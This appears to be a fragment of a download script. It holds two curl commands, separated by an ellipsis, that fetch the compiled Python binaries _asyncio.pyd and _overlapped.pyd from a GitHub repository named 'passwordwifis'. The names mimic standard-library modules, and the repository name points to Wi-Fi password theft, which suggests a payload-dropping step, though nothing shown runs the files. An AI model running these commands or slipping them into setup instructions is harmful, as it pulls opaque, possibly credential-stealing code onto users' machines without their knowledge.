curl -o _asyncio.pyd https://github.com/Zeyad-abd/passwordwifis/blob/main/_asyncio.pyd?raw=true -LJO
...
curl -o _overlapped.pyd https://github.com/Zeyad-abd/passwordwifis/blob/main/_overlapped.pyd?raw=true -LJO
